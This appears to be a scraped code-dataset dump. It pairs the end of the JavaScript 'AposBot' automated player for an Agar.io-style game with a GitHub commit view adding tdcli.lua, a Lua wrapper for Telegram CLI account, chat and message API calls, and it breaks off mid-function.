destination[1];                     u.drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                 } else {                     //If there are no enemies around and no food to eat.                     destinationChoices = [tempMoveX, tempMoveY];                 }                  u.drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """");                 //drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """" + Math.floor(computeDistance(tempPoint[0], tempPoint[1], I, J)));                 //drawLine(tempPoint[0], tempPoint[1], player[0].x, player[0].y, 6);                 //console.log(""Slope: "" + slope(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Angle: "" + getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Side: "" + (getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) - 90).mod(360));                 tempPoint[2] = 1;                  //console.log(""Done working on blob: "" + i);             }              //TODO: Find where to go based on destinationChoices.             /*var dangerFound = false;             for (var i = 0; i < destinationChoices.length; i++) {                 if (destinationChoices[i][2]) {                     dangerFound = true;                     break;                 }             }             destinationChoices.sort(function(a, b){return b[1] - a[1]});             if (dangerFound) {                 for (var i = 0; i < destinationChoices.length; i++) {                     if (destinationChoices[i][2]) {                         tempMoveX = destinationChoices[i][0][0];                         tempMoveY = destinationChoices[i][0][1];                         break;                     }                 }             } else {                 tempMoveX = destinationChoices.peek()[0][0];                 tempMoveY = destinationChoices.peek()[0][1];                 //console.log(""Done "" + tempMoveX + "", "" + tempMoveY);             }*/         }         //console.log(""MOVING RIGHT NOW!"");          //console.log(""______Never lied ever in my life."");          return destinationChoices;     } };  /**  * A conversion from the screen\'s horizontal coordinate system  * to the game\'s horizontal coordinate system.  * @param x in the screen\'s coordinate system  * @return x in the game\'s coordinate system  */ u.screenToGameX = function(x) {     return (x - getWidth() / 2) / getRatio() + getX(); };  /**  * A conversion from the screen\'s vertical coordinate system  * to the game\'s vertical coordinate system.  * @param y in the screen\'s coordinate system  * @return y in the game\'s coordinate system  */ u.screenToGameY = function(y) {     return (y - getHeight() / 2) / getRatio() + getY(); };  u.drawPoint = function(x_1, y_1, drawColor, text) {     f.drawPoint(x_1, y_1, drawColor, text); };  u.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {     f.drawArc(x_1, y_1, x_2, y_2, x_3, y_3, drawColor); };  u.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {     f.drawLine(x_1, y_1, x_2, y_2, drawColor); };  u.drawCircle = function(x_1, y_1, radius, drawColor) {     f.drawCircle(x_1, y_1, radius, drawColor); };  /**  * Some horse shit of some sort.  * @return Horse Shit  */ u.screenDistance = function() {     var temp = f.getScreenDistance();     return temp; };  /**  * Tells you if the game is in Dark mode.  * @return Boolean for dark mode.  */ u.getDarkBool = function() {     return f.getDarkBool(); };  /**  * Tells you if the mass is shown.  * @return Boolean for player\'s mass.  */ u.getMassBool = function() {     return f.getMassBool(); };  /**  * This is a copy of everything that is shown on screen.  * Normally stuff will time out when off the screen, this  * memorizes everything that leaves the screen for a little  * while longer.  * @return The memory object.  */ u.getMemoryCells = function() {     return f.getMemoryCells(); };  /**  * [getCellsArray description]  * @return {[type]} [description]  */ u.getCellsArray = function() {     return f.getCellsArray(); };  /**  * This is the original ""getMemoryCells"" without the memory part.  * @return Non memorized object.  */ u.getCells = function() {     return f.getCells(); };  /**  * Returns an array with all the player\'s cells.  * @return Player\'s cells  */ u.getPlayer = function () {     return f.getPlayer(); };  /**  * The canvas\' width.  * @return Integer Width  */ u.getWidth = function() {     return f.getWidth(); };  /**  * The canvas\' height  * @return Integer Height  */ u.getHeight = function() {     return f.getHeight(); };  /**  * Scaling ratio of the canvas. The bigger this ration,  * the further that you see.  * @return Screen scaling ratio.  */ u.getRatio = function() {     return f.getRatio(); };  /**  * [getOffsetX description]  * @return {[type]} [description]  */ u.getOffsetX = function() {     return f.getOffsetX(); };  u.getOffsetY = function() {     return f.getOffsetY(); };  u.getX = function() {     return f.getX(); };  u.getY = function() {     return f.getY(); };  u.getPointX = function() {     return f.getPointX(); };  u.getPointY = function() {     return f.getPointY(); };  /**  * The X location of the mouse.  * @return Integer X  */ u.getMouseX = function() {     return f.getMouseX(); };  /**  * The Y location of the mouse.  * @return Integer Y  */ u.getMouseY = function() {     return f.getMouseY(); };  /**  * A timestamp since the last time the server sent any data.  * @return Last update timestamp  */ u.getUpdate = function() {     return f.getLastUpdate(); };  /**  * The game\'s current mode. ("":ffa"", "":experimental"", "":teams"". "":party"")  * @return {[type]} [description]  */ u.getMode = function() {     return f.getMode(); };  f.botList.push([""AposBot "" + aposBotVersion, u.findDestination]);  u.bList = g(\'#bList\'); g(\'<option />\', {value: (f.botList.length - 1), text: ""AposBot""}).appendTo(bList);",,2
0,https://github.com/arashstar1/bot-lua.git,"Code  Issues 0  Pull requests 0  Pulse  MaTaDoR/ 3233fdf V 5.7 MaTaDoR @MaTaDoRTeaMMaTaDoRTeaM committed on GitHub about 1 month ago 2 changed files 2,704 additions and 0 deletions cli/tg/tdcli.lua @@ -0,0 +1,2704 @@ +--[[ +   This program is free software; you can redistribute it and/or modify +   it under the terms of the GNU General Public License as published by +   the Free Software Foundation; either version 2 of the License, or +   (at your option) any later version. + +   This program is distributed in the hope that it will be useful, +   but WITHOUT ANY WARRANTY; without even the implied warranty of +   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the +   GNU General Public License for more details. + +   You should have received a copy of the GNU General Public License +   along with this program; if not, write to the Free Software +   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, +   MA 02110-1301, USA. + +]]-- + +-- Vector example form is like this: {[0] = v} or {v1, v2, v3, [0] = v} +-- If false or true crashed your telegram-cli, try to change true to 1 and false to 0 + +-- Main Bot Framework +local M = {} + +-- @chat_id = user, group, channel, and broadcast +-- @group_id = normal group +-- @channel_id = channel and broadcast +local function getChatId(chat_id) +  local chat = {} +  local chat_id = tostring(chat_id) + +  if chat_id:match(\'^-100\') then +    local channel_id = chat_id:gsub(\'-100\', \'\') +    chat = {ID = channel_id, type = \'channel\ +  else +    local group_id = chat_id:gsub(\'-\', \'\') +    chat = {ID = group_id, type = \'group\ +  end + +  return chat +end + +local function getInputFile(file) +  if file:match(\'/\') then +    infile = {ID = ""InputFileLocal"", path_ = file} +  elseif file:match(\'^%d+$\') then +    infile = {ID = ""InputFileId"", id_ = file} +  else +    infile = {ID = ""InputFilePersistentId"", persistent_id_ = file} +  end + +  return infile +end + +-- User can send bold, italic, and monospace text uses HTML or Markdown format. +local function getParseMode(parse_mode) +  if parse_mode then +    local mode = parse_mode:lower() + +    if mode == \'markdown\' or mode == \'md\' then +      P = {ID = ""TextParseModeMarkdown""} +    elseif mode == \'html\' then +      P = {ID = ""TextParseModeHTML""} +    end +  end + +  return P +end + +-- Returns current authorization state, offline request +local function getAuthState(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetAuthState"", +  }, dl_cb, cmd) +end + +M.getAuthState = getAuthState + +-- Sets user\'s phone number and sends authentication code to the user. +-- Works only when authGetState returns authStateWaitPhoneNumber. +-- If phone number is not recognized or another error has happened, returns an error. Otherwise returns authStateWaitCode +-- @phone_number User\'s phone number in any reasonable format +-- @allow_flash_call Pass True, if code can be sent via flash call to the specified phone number +-- @is_current_phone_number Pass true, if the phone number is used on the current device. Ignored if allow_flash_call is False +local function setAuthPhoneNumber(phone_number, allow_flash_call, is_current_phone_number, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetAuthPhoneNumber"", +    phone_number_ = phone_number, +    allow_flash_call_ = allow_flash_call, +    is_current_phone_number_ = is_current_phone_number +  }, dl_cb, cmd) +end + +M.setAuthPhoneNumber = setAuthPhoneNumber + +-- Resends authentication code to the user. +-- Works only when authGetState returns authStateWaitCode and next_code_type of result is not null. +-- Returns authStateWaitCode on success +local function resendAuthCode(dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResendAuthCode"", +  }, dl_cb, cmd) +end + +M.resendAuthCode = resendAuthCode + +-- Checks authentication code. +-- Works only when authGetState returns authStateWaitCode. +-- Returns authStateWaitPassword or authStateOk on success +-- @code Verification code from SMS, Telegram message, voice call or flash call +-- @first_name User first name, if user is yet not registered, 1-255 characters +-- @last_name Optional user last name, if user is yet not registered, 0-255 characters +local function checkAuthCode(code, first_name, last_name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckAuthCode"", +    code_ = code, +    first_name_ = first_name, +    last_name_ = last_name +  }, dl_cb, cmd) +end + +M.checkAuthCode = checkAuthCode + +-- Checks password for correctness. +-- Works only when authGetState returns authStateWaitPassword. +-- Returns authStateOk on success +-- @password Password to check +local function checkAuthPassword(password, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckAuthPassword"", +    password_ = password +  }, dl_cb, cmd) +end + +M.checkAuthPassword = checkAuthPassword + +-- Requests to send password recovery code to email. +-- Works only when authGetState returns authStateWaitPassword. +-- Returns authStateWaitPassword on success +local function requestAuthPasswordRecovery(dl_cb, cmd) +  tdcli_function ({ +    ID = ""RequestAuthPasswordRecovery"", +  }, dl_cb, cmd) +end + +M.requestAuthPasswordRecovery = requestAuthPasswordRecovery + +-- Recovers password with recovery code sent to email. +-- Works only when authGetState returns authStateWaitPassword. +-- Returns authStateOk on success +-- @recovery_code Recovery code to check +local function recoverAuthPassword(recovery_code, dl_cb, cmd) +  tdcli_function ({ +    ID = ""RecoverAuthPassword"", +    recovery_code_ = recovery_code +  }, dl_cb, cmd) +end + +M.recoverAuthPassword = recoverAuthPassword + +-- Logs out user. +-- If force == false, begins to perform soft log out, returns authStateLoggingOut after completion. +-- If force == true then succeeds almost immediately without cleaning anything at the server, but returns error with code 401 and description ""Unauthorized"" +-- @force If true, just delete all local data. Session will remain in list of active sessions +local function resetAuth(force, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResetAuth"", +    force_ = force or nil +  }, dl_cb, cmd) +end + +M.resetAuth = resetAuth + +-- Check bot\'s authentication token to log in as a bot. +-- Works only when authGetState returns authStateWaitPhoneNumber. +-- Can be used instead of setAuthPhoneNumber and checkAuthCode to log in. +-- Returns authStateOk on success +-- @token Bot token +local function checkAuthBotToken(token, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckAuthBotToken"", +    token_ = token +  }, dl_cb, cmd) +end + +M.checkAuthBotToken = checkAuthBotToken + +-- Returns current state of two-step verification +local function getPasswordState(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetPasswordState"", +  }, dl_cb, cmd) +end + +M.getPasswordState = getPasswordState + +-- Changes user password. +-- If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email confirmation. +-- Application should call getPasswordState from time to time to check if email is already confirmed +-- @old_password Old user password +-- @new_password New user password, may be empty to remove the password +-- @new_hint New password hint, can be empty +-- @set_recovery_email Pass True, if recovery email should be changed +-- @new_recovery_email New recovery email, may be empty +local function setPassword(old_password, new_password, new_hint, set_recovery_email, new_recovery_email, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetPassword"", +    old_password_ = old_password, +    new_password_ = new_password, +    new_hint_ = new_hint, +    set_recovery_email_ = set_recovery_email, +    new_recovery_email_ = new_recovery_email +  }, dl_cb, cmd) +end + +M.setPassword = setPassword + +-- Returns set up recovery email. +-- This method can be used to verify a password provided by the user +-- @password Current user password +local function getRecoveryEmail(password, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetRecoveryEmail"", +    password_ = password +  }, dl_cb, cmd) +end + +M.getRecoveryEmail = getRecoveryEmail + +-- Changes user recovery email. +-- If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and email will not be changed until email confirmation. +-- Application should call getPasswordState from time to time to check if email is already confirmed. +-- If new_recovery_email coincides with the current set up email succeeds immediately and aborts all other requests waiting for email confirmation +-- @password Current user password +-- @new_recovery_email New recovery email +local function setRecoveryEmail(password, new_recovery_email, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetRecoveryEmail"", +    password_ = password, +    new_recovery_email_ = new_recovery_email +  }, dl_cb, cmd) +end + +M.setRecoveryEmail = setRecoveryEmail + +-- Requests to send password recovery code to email +local function requestPasswordRecovery(dl_cb, cmd) +  tdcli_function ({ +    ID = ""RequestPasswordRecovery"", +  }, dl_cb, cmd) +end + +M.requestPasswordRecovery = requestPasswordRecovery + +-- Recovers password with recovery code sent to email +-- @recovery_code Recovery code to check +local function recoverPassword(recovery_code, dl_cb, cmd) +  tdcli_function ({ +    ID = ""RecoverPassword"", +    recovery_code_ = tostring(recovery_code) +  }, dl_cb, cmd) +end + +M.recoverPassword = recoverPassword + +-- Returns current logged in user +local function getMe(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetMe"", +  }, dl_cb, cmd) +end + +M.getMe = getMe + +-- Returns information about a user by its identifier, offline request if current user is not a bot +-- @user_id User identifier +local function getUser(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetUser"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getUser = getUser + +-- Returns full information about a user by its identifier +-- @user_id User identifier +local function getUserFull(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetUserFull"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getUserFull = getUserFull + +-- Returns information about a group by its identifier, offline request if current user is not a bot +-- @group_id Group identifier +local function getGroup(group_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetGroup"", +    group_id_ = getChatId(group_id).ID +  }, dl_cb, cmd) +end + +M.getGroup = getGroup + +-- Returns full information about a group by its identifier +-- @group_id Group identifier +local function getGroupFull(group_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetGroupFull"", +    group_id_ = getChatId(group_id).ID +  }, dl_cb, cmd) +end + +M.getGroupFull = getGroupFull + +-- Returns information about a channel by its identifier, offline request if current user is not a bot +-- @channel_id Channel identifier +local function getChannel(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChannel"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.getChannel = getChannel + +-- Returns full information about a channel by its identifier, cached for at most 1 minute +-- @channel_id Channel identifier +local function getChannelFull(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChannelFull"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.getChannelFull = getChannelFull + +-- Returns information about a secret chat by its identifier, offline request +-- @secret_chat_id Secret chat identifier +local function getSecretChat(secret_chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetSecretChat"", +    secret_chat_id_ = secret_chat_id +  }, dl_cb, cmd) +end + +M.getSecretChat = getSecretChat + +-- Returns information about a chat by its identifier, offline request if current user is not a bot +-- @chat_id Chat identifier +local function getChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.getChat = getChat + +-- Returns information about a message +-- @chat_id Identifier of the chat, message belongs to +-- @message_id Identifier of the message to get +local function getMessage(chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetMessage"", +    chat_id_ = chat_id, +    message_id_ = message_id +  }, dl_cb, cmd) +end + +M.getMessage = getMessage + +-- Returns information about messages. +-- If message is not found, returns null on the corresponding position of the result +-- @chat_id Identifier of the chat, messages belongs to +-- @message_ids Identifiers of the messages to get +local function getMessages(chat_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetMessages"", +    chat_id_ = chat_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.getMessages = getMessages + +-- Returns information about a file, offline request +-- @file_id Identifier of the file to get +local function getFile(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetFile"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.getFile = getFile + +-- Returns information about a file by its persistent id, offline request +-- @persistent_file_id Persistent identifier of the file to get +local function getFilePersistent(persistent_file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetFilePersistent"", +    persistent_file_id_ = persistent_file_id +  }, dl_cb, cmd) +end + +M.getFilePersistent = getFilePersistent + +-- Returns list of chats in the right order, chats are sorted by (order, chat_id) in decreasing order. +-- For example, to get list of chats from the beginning, the offset_order should be equal 2^63 - 1 +-- @offset_order Chat order to return chats from +-- @offset_chat_id Chat identifier to return chats from +-- @limit Maximum number of chats to be returned +local function getChats(offset_order, offset_chat_id, limit, dl_cb, cmd) +  if not limit or limit > 20 then +    limit = 20 +  end + +  tdcli_function ({ +    ID = ""GetChats"", +    offset_order_ = offset_order or 9223372036854775807, +    offset_chat_id_ = offset_chat_id or 0, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getChats = getChats + +-- Searches public chat by its username. +-- Currently only private and channel chats can be public. +-- Returns chat if found, otherwise some error is returned +-- @username Username to be resolved +local function searchPublicChat(username, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchPublicChat"", +    username_ = username +  }, dl_cb, cmd) +end + +M.searchPublicChat = searchPublicChat + +-- Searches public chats by prefix of their username. +-- Currently only private and channel (including supergroup) chats can be public. +-- Returns meaningful number of results. +-- Returns nothing if length of the searched username prefix is less than 5. +-- Excludes private chats with contacts from the results +-- @username_prefix Prefix of the username to search +local function searchPublicChats(username_prefix, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchPublicChats"", +    username_prefix_ = username_prefix +  }, dl_cb, cmd) +end + +M.searchPublicChats = searchPublicChats + +-- Searches for specified query in the title and username of known chats, offline request. +-- Returns chats in the order of them in the chat list +-- @query Query to search for, if query is empty, returns up to 20 recently found chats +-- @limit Maximum number of chats to be returned +local function searchChats(query, limit, dl_cb, cmd) +  if not limit or limit > 20 then +    limit = 20 +  end + +  tdcli_function ({ +    ID = ""SearchChats"", +    query_ = query, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.searchChats = searchChats + +-- Adds chat to the list of recently found chats. +-- The chat is added to the beginning of the list. +-- If the chat is already in the list, at first it is removed from the list +-- @chat_id Identifier of the chat to add +local function addRecentlyFoundChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddRecentlyFoundChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.addRecentlyFoundChat = addRecentlyFoundChat + +-- Deletes chat from the list of recently found chats +-- @chat_id Identifier of the chat to delete +local function deleteRecentlyFoundChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteRecentlyFoundChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.deleteRecentlyFoundChat = deleteRecentlyFoundChat + +-- Clears list of recently found chats +local function deleteRecentlyFoundChats(dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteRecentlyFoundChats"", +  }, dl_cb, cmd) +end + +M.deleteRecentlyFoundChats = deleteRecentlyFoundChats + +-- Returns list of common chats with an other given user. +-- Chats are sorted by their type and creation date +-- @user_id User identifier +-- @offset_chat_id Chat identifier to return chats from, use 0 for the first request +-- @limit Maximum number of chats to be returned, up to 100 +local function getCommonChats(user_id, offset_chat_id, limit, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""GetCommonChats"", +    user_id_ = user_id, +    offset_chat_id_ = offset_chat_id, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getCommonChats = getCommonChats + +-- Returns messages in a chat. +-- Automatically calls openChat. +-- Returns result in reverse chronological order, i.e. in order of decreasing message.message_id +-- @chat_id Chat identifier +-- @from_message_id Identifier of the message near which we need a history, you can use 0 to get results from the beginning, i.e. from oldest to newest +-- @offset Specify 0 to get results exactly from from_message_id or negative offset to get specified message and some newer messages +-- @limit Maximum number of messages to be returned, should be positive and can\'t be greater than 100. +-- If offset is negative, limit must be greater than -offset. +-- There may be less than limit messages returned even the end of the history is not reached +local function getChatHistory(chat_id, from_message_id, offset, limit, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""GetChatHistory"", +    chat_id_ = chat_id, +    from_message_id_ = from_message_id, +    offset_ = offset or 0, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getChatHistory = getChatHistory + +-- Deletes all messages in the chat. +-- Can\'t be used for channel chats +-- @chat_id Chat identifier +-- @remove_from_chat_list Pass true, if chat should be removed from the chat list +local function deleteChatHistory(chat_id, remove_from_chat_list, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteChatHistory"", +    chat_id_ = chat_id, +    remove_from_chat_list_ = remove_from_chat_list +  }, dl_cb, cmd) +end + +M.deleteChatHistory = deleteChatHistory + +-- Searches for messages with given words in the chat. +-- Returns result in reverse chronological order, i. e. in order of decreasimg message_id. +-- Doesn\'t work in secret chats +-- @chat_id Chat identifier to search in +-- @query Query to search for +-- @from_message_id Identifier of the message from which we need a history, you can use 0 to get results from beginning +-- @limit Maximum number of messages to be returned, can\'t be greater than 100 +-- @filter Filter for content of searched messages +-- filter = Empty|Animation|Audio|Document|Photo|Video|Voice|PhotoAndVideo|Url|ChatPhoto +local function searchChatMessages(chat_id, query, from_message_id, limit, filter, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""SearchChatMessages"", +    chat_id_ = chat_id, +    query_ = query, +    from_message_id_ = from_message_id, +    limit_ = limit, +    filter_ = { +      ID = \'SearchMessagesFilter\' .. filter +    }, +  }, dl_cb, cmd) +end + +M.searchChatMessages = searchChatMessages + +-- Searches for messages in all chats except secret chats. Returns result in reverse chronological order, i. e. in order of decreasing (date, chat_id, message_id) +-- @query Query to search for +-- @offset_date Date of the message to search from, you can use 0 or any date in the future to get results from the beginning +-- @offset_chat_id Chat identifier of the last found message or 0 for the first request +-- @offset_message_id Message identifier of the last found message or 0 for the first request +-- @limit Maximum number of messages to be returned, can\'t be greater than 100 +local function searchMessages(query, offset_date, offset_chat_id, offset_message_id, limit, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""SearchMessages"", +    query_ = query, +    offset_date_ = offset_date, +    offset_chat_id_ = offset_chat_id, +    offset_message_id_ = offset_message_id, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.searchMessages = searchMessages + +-- Invites bot to a chat (if it is not in the chat) and send /start to it. +-- Bot can\'t be invited to a private chat other than chat with the bot. +-- Bots can\'t be invited to broadcast channel chats and secret chats. +-- Returns sent message. +-- UpdateChatTopMessage will not be sent, so returned message should be used to update chat top message +-- @bot_user_id Identifier of the bot +-- @chat_id Identifier of the chat +-- @parameter Hidden parameter sent to bot for deep linking (https://api.telegram.org/bots#deep-linking) +-- parameter=start|startgroup or custom as defined by bot creator +local function sendBotStartMessage(bot_user_id, chat_id, parameter, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendBotStartMessage"", +    bot_user_id_ = bot_user_id, +    chat_id_ = chat_id, +    parameter_ = parameter +  }, dl_cb, cmd) +end + +M.sendBotStartMessage = sendBotStartMessage + +-- Sends result of the inline query as a message. +-- Returns sent message. +-- UpdateChatTopMessage will not be sent, so returned message should be used to update chat top message. +-- Always clears chat draft message +-- @chat_id Chat to send message +-- @reply_to_message_id Identifier of a message to reply to or 0 +-- @disable_notification Pass true, to disable notification about the message, doesn\'t works in secret chats +-- @from_background Pass true, if the message is sent from background +-- @query_id Identifier of the inline query +-- @result_id Identifier of the inline result +local function sendInlineQueryResultMessage(chat_id, reply_to_message_id, disable_notification, from_background, query_id, result_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendInlineQueryResultMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    query_id_ = query_id, +    result_id_ = result_id +  }, dl_cb, cmd) +end + +M.sendInlineQueryResultMessage = sendInlineQueryResultMessage + +-- Forwards previously sent messages. +-- Returns forwarded messages in the same order as message identifiers passed in message_ids. +-- If message can\'t be forwarded, null will be returned instead of the message. +-- UpdateChatTopMessage will not be sent, so returned messages should be used to update chat top message +-- @chat_id Identifier of a chat to forward messages +-- @from_chat_id Identifier of a chat to forward from +-- @message_ids Identifiers of messages to forward +-- @disable_notification Pass true, to disable notification about the message, doesn\'t works if messages are forwarded to secret chat +-- @from_background Pass true, if the message is sent from background +local function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ForwardMessages"", +    chat_id_ = chat_id, +    from_chat_id_ = from_chat_id, +    message_ids_ = message_ids, -- vector +    disable_notification_ = disable_notification, +    from_background_ = 1 +  }, dl_cb, cmd) +end + +M.forwardMessages = forwardMessages + +-- Changes current ttl setting in a secret chat and sends corresponding message +-- @chat_id Chat identifier +-- @ttl New value of ttl in seconds +local function sendChatSetTtlMessage(chat_id, ttl, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendChatSetTtlMessage"", +    chat_id_ = chat_id, +    ttl_ = ttl +  }, dl_cb, cmd) +end + +M.sendChatSetTtlMessage = sendChatSetTtlMessage + +-- Deletes messages. +-- UpdateDeleteMessages will not be sent for messages deleted through that function +-- @chat_id Chat identifier +-- @message_ids Identifiers of messages to delete +local function deleteMessages(chat_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteMessages"", +    chat_id_ = chat_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.deleteMessages = deleteMessages + +-- Deletes all messages in the chat sent by the specified user. +-- Works only in supergroup channel chats, needs appropriate privileges +-- @chat_id Chat identifier +-- @user_id User identifier +local function deleteMessagesFromUser(chat_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteMessagesFromUser"", +    chat_id_ = chat_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.deleteMessagesFromUser = deleteMessagesFromUser + +-- Edits text of text or game message. +-- Non-bots can edit message in a limited period of time. +-- Returns edited message after edit is complete server side +-- @chat_id Chat the message belongs to +-- @message_id Identifier of the message +-- @reply_markup Bots only. New message reply markup +-- @input_message_content New text content of the message. Should be of type InputMessageText +local function editMessageText(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode, dl_cb, cmd) +  local TextParseMode = getParseMode(parse_mode) + +  tdcli_function ({ +    ID = ""EditMessageText"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    input_message_content_ = { +      ID = ""InputMessageText"", +      text_ = text, +      disable_web_page_preview_ = disable_web_page_preview, +      clear_draft_ = 0, +      entities_ = {}, +      parse_mode_ = TextParseMode, +    }, +  }, dl_cb, cmd) +end + +M.editMessageText = editMessageText + +-- Edits message content caption. +-- Non-bots can edit message in a limited period of time. +-- Returns edited message after edit is complete server side +-- @chat_id Chat the message belongs to +-- @message_id Identifier of the message +-- @reply_markup Bots only. New message reply markup +-- @caption New message content caption, 0-200 characters +local function editMessageCaption(chat_id, message_id, reply_markup, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditMessageCaption"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    caption_ = caption +  }, dl_cb, cmd) +end + +M.editMessageCaption = editMessageCaption + +-- Bots only. +-- Edits message reply markup. +-- Returns edited message after edit is complete server side +-- @chat_id Chat the message belongs to +-- @message_id Identifier of the message +-- @reply_markup New message reply markup +local function editMessageReplyMarkup(inline_message_id, reply_markup, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageCaption"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    caption_ = caption +  }, dl_cb, cmd) +end + +M.editMessageReplyMarkup = editMessageReplyMarkup + +-- Bots only. +-- Edits text of an inline text or game message sent via bot +-- @inline_message_id Inline message identifier +-- @reply_markup New message reply markup +-- @input_message_content New text content of the message. Should be of type InputMessageText +local function editInlineMessageText(inline_message_id, reply_markup, text, disable_web_page_preview, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageText"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    input_message_content_ = { +      ID = ""InputMessageText"", +      text_ = text, +      disable_web_page_preview_ = disable_web_page_preview, +      clear_draft_ = 0, +      entities_ = {} +    }, +  }, dl_cb, cmd) +end + +M.editInlineMessageText = editInlineMessageText + +-- Bots only. +-- Edits caption of an inline message content sent via bot +-- @inline_message_id Inline message identifier +-- @reply_markup New message reply markup +-- @caption New message content caption, 0-200 characters +local function editInlineMessageCaption(inline_message_id, reply_markup, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageCaption"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    caption_ = caption +  }, dl_cb, cmd) +end + +M.editInlineMessageCaption = editInlineMessageCaption + +-- Bots only. +-- Edits reply markup of an inline message sent via bot +-- @inline_message_id Inline message identifier +-- @reply_markup New message reply markup +local function editInlineMessageReplyMarkup(inline_message_id, reply_markup, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageReplyMarkup"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup -- reply_markup:ReplyMarkup +  }, dl_cb, cmd) +end + +M.editInlineMessageReplyMarkup = editInlineMessageReplyMarkup + + +-- Sends inline query to a bot and returns its results. +-- Unavailable for bots +-- @bot_user_id Identifier of the bot send query to +-- @chat_id Identifier of the chat, where the query is sent +-- @user_location User location, only if needed +-- @query Text of the query +-- @offset Offset of the first entry to return +local function getInlineQueryResults(bot_user_id, chat_id, latitude, longitude, query, offset, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetInlineQueryResults"", +    bot_user_id_ = bot_user_id, +    chat_id_ = chat_id, +    